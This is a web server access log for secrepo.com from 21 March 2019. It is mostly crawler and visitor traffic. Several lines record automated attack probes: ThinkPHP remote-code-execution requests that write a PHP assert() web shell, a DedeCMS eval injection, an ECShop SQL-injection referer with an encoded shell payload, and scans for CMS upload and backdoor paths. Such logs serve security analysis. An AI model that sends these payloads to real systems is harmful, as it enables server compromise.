54.36.150.175 - - [21/Mar/2019:02:12:01 -0700] "GET /self.logs/2015/error.log.2015-10-26.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
91.218.224.5 - - [21/Mar/2019:06:53:36 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
91.218.224.5 - - [21/Mar/2019:06:58:16 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1603 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
91.218.224.5 - - [21/Mar/2019:06:58:18 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/http.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.148.136 - - [21/Mar/2019:06:59:41 -0700] "GET /self.logs/access.log.2018-08-29.gz HTTP/1.1" 200 39715 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
91.218.224.5 - - [21/Mar/2019:06:53:50 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 54258816 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
14.215.176.11 - - [21/Mar/2019:07:03:27 -0700] "GET / HTTP/1.1" 200 12511 "http://www.baidu.com/s?wd=handlb9" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
41.223.160.131 - - [21/Mar/2019:07:04:39 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.31 - - [21/Mar/2019:07:05:13 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/loaded_scripts.html HTTP/1.1" 200 1381 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.149 - - [21/Mar/2019:07:14:18 -0700] "GET /self.logs/access.log.2019-02-26.gz HTTP/1.1" 200 24475 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
95.163.255.169 - - [21/Mar/2019:07:14:23 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.165 - - [21/Mar/2019:07:14:25 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1508 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
110.74.197.211 - - [21/Mar/2019:07:16:31 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:31 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:32 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:32 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:32 -0700] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:33 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:33 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:33 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:34 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:34 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:34 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:34 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:35 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=diorf.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=diorf.php&content=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:37 -0700] "GET /diorf.php HTTP/1.1" 404 295 "http://www.secrepo.com/diorf.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:38 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:38 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:38 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=kbjbj.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=kbjbj.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
110.74.197.211 - - [21/Mar/2019:07:16:39 -0700] "GET /kbjbj.php HTTP/1.1" 404 294 "http://www.secrepo.com/kbjbj.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
218.30.103.9 - - [21/Mar/2019:07:18:14 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
117.136.44.159 - - [21/Mar/2019:07:18:32 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Dalvik/2.1.0 (Linux; U; Android 9; EML-AL00 Build/HUAWEIEML-AL00)" 
117.136.44.159 - - [21/Mar/2019:07:18:32 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Dalvik/2.1.0 (Linux; U; Android 9; EML-AL00 Build/HUAWEIEML-AL00)" 
218.30.103.9 - - [21/Mar/2019:07:18:43 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
113.102.16.234 - - [21/Mar/2019:07:16:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1113120 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:34.0) Gecko/20100101 Firefox/34.0" 
218.30.103.9 - - [21/Mar/2019:07:18:52 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
113.171.224.176 - - [21/Mar/2019:07:20:38 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
218.30.103.9 - - [21/Mar/2019:07:21:34 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
54.36.148.55 - - [21/Mar/2019:07:22:09 -0700] "GET /self.logs/access.log.2015-07-26.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.102.16.234 - - [21/Mar/2019:07:22:17 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 629280 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:34.0) Gecko/20100101 Firefox/34.0" 
113.102.16.234 - - [21/Mar/2019:07:23:06 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 738720 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:34.0) Gecko/20100101 Firefox/34.0" 
129.242.224.63 - - [21/Mar/2019:07:24:24 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
129.242.224.63 - - [21/Mar/2019:07:24:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
129.242.224.63 - - [21/Mar/2019:07:24:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
129.242.224.63 - - [21/Mar/2019:07:24:24 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
113.102.16.234 - - [21/Mar/2019:07:24:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 548640 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:34.0) Gecko/20100101 Firefox/34.0" 
54.36.150.83 - - [21/Mar/2019:07:25:34 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 301 490 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
93.63.134.54 - - [21/Mar/2019:07:28:01 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
93.63.134.54 - - [21/Mar/2019:07:28:01 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
93.63.134.54 - - [21/Mar/2019:07:28:02 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
93.63.134.54 - - [21/Mar/2019:07:28:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
54.36.150.41 - - [21/Mar/2019:07:28:38 -0700] "GET /self.logs/error.log.2018-04-27.gz HTTP/1.1" 200 3114 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.36 - - [21/Mar/2019:07:31:32 -0700] "GET /self.logs/access.log.2017-04-11.gz HTTP/1.1" 200 32342 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
108.59.8.70 - - [21/Mar/2019:07:42:02 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [21/Mar/2019:07:42:03 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [21/Mar/2019:07:42:05 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [21/Mar/2019:07:42:08 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.150.56 - - [21/Mar/2019:07:44:09 -0700] "GET /self.logs/error.log.2019-02-03.gz HTTP/1.1" 200 2850 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.199 - - [21/Mar/2019:07:47:16 -0700] "GET /self.logs/2015/error.log.2015-08-26.gz HTTP/1.1" 200 627 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.154 - - [21/Mar/2019:07:51:21 -0700] "GET /self.logs/error.log.2015-10-22.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
46.217.204.71 - - [21/Mar/2019:07:53:48 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.149.98 - - [21/Mar/2019:07:54:58 -0700] "GET /self.logs/error.log.2019-03-08.gz HTTP/1.1" 200 5640 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.122 - - [21/Mar/2019:07:58:13 -0700] "GET /self.logs/error.log.2017-01-14.gz HTTP/1.1" 200 758 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.26 - - [21/Mar/2019:07:58:52 -0700] "GET /self.logs/access.log.2018-09-25.gz HTTP/1.1" 200 24595 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
122.114.72.221 - - [21/Mar/2019:08:00:35 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.72.221 - - [21/Mar/2019:08:00:38 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 295 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.72.221 - - [21/Mar/2019:08:00:38 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.72.221 - - [21/Mar/2019:08:00:38 -0700] "POST //lequ.php HTTP/1.1" 404 294 "http://www.secrepo.com//lequ.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.72.221 - - [21/Mar/2019:08:00:39 -0700] "POST //plus/result.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/result.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.72.221 - - [21/Mar/2019:08:00:39 -0700] "POST //pdf.php HTTP/1.1" 404 294 "http://www.secrepo.com//pdf.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
54.36.150.28 - - [21/Mar/2019:08:08:02 -0700] "GET /self.logs/access.log.2017-03-13.gz HTTP/1.1" 200 43199 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
176.199.208.53 - - [21/Mar/2019:08:11:06 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
176.199.208.53 - - [21/Mar/2019:08:11:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
176.199.208.53 - - [21/Mar/2019:08:11:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
176.199.208.53 - - [21/Mar/2019:08:11:07 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.148.151 - - [21/Mar/2019:08:12:59 -0700] "GET /self.logs/error.log.2015-06-30.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
124.193.145.45 - - [21/Mar/2019:08:17:04 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
54.36.150.105 - - [21/Mar/2019:08:18:41 -0700] "GET /self.logs/error.log.2015-10-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.14 - - [21/Mar/2019:08:23:26 -0700] "GET /self.logs/access.log.2017-06-17.gz HTTP/1.1" 200 35672 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [21/Mar/2019:08:27:20 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
162.210.196.98 - - [21/Mar/2019:08:35:01 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [21/Mar/2019:08:35:02 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.148.241 - - [21/Mar/2019:08:36:10 -0700] "GET /self.logs/2016/access.log.2016-02-29.gz HTTP/1.1" 200 8599 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.74 - - [21/Mar/2019:08:38:52 -0700] "GET /self.logs/access.log.2018-11-07.gz HTTP/1.1" 200 17216 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.161 - - [21/Mar/2019:08:40:52 -0700] "GET /self.logs/access.log.2015-10-05.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
101.226.102.70 - - [21/Mar/2019:08:50:55 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117" 
61.129.6.203 - - [21/Mar/2019:08:51:24 -0700] "GET / HTTP/1.1" 200 12511 "" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MX4 Pro Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
61.129.6.203 - - [21/Mar/2019:08:51:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MX4 Pro Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
61.129.6.203 - - [21/Mar/2019:08:51:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MX4 Pro Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
4.14.104.185 - - [21/Mar/2019:08:52:11 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0" 
4.14.104.185 - - [21/Mar/2019:08:52:11 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0" 
4.14.104.185 - - [21/Mar/2019:08:52:11 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0" 
4.14.104.185 - - [21/Mar/2019:08:52:11 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0" 
52.1.109.34 - - [21/Mar/2019:08:54:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "-" "Embedly +support@embed.ly" 
108.59.8.80 - - [21/Mar/2019:08:58:47 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.80 - - [21/Mar/2019:08:58:49 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.148.172 - - [21/Mar/2019:09:02:13 -0700] "GET /self.logs/error.log.2015-06-28.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.119 - - [21/Mar/2019:09:03:47 -0700] "GET /self.logs/2016/error.log.2016-11-26.gz HTTP/1.1" 200 650 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
100.27.37.89 - - [21/Mar/2019:09:04:29 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
100.27.37.89 - - [21/Mar/2019:09:04:29 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
23.231.12.64 - - [21/Mar/2019:09:08:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279381 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1147.42" 
122.97.182.109 - - [21/Mar/2019:09:11:39 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
54.36.148.16 - - [21/Mar/2019:09:15:54 -0700] "GET /self.logs/access.log.2018-10-07.gz HTTP/1.1" 200 22555 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.93 - - [21/Mar/2019:09:16:08 -0700] "GET /self.logs/2016/error.log.2016-04-29.gz HTTP/1.1" 200 675 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.104 - - [21/Mar/2019:09:16:09 -0700] "GET /self.logs/error.log.2017-10-23.gz HTTP/1.1" 200 2332 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
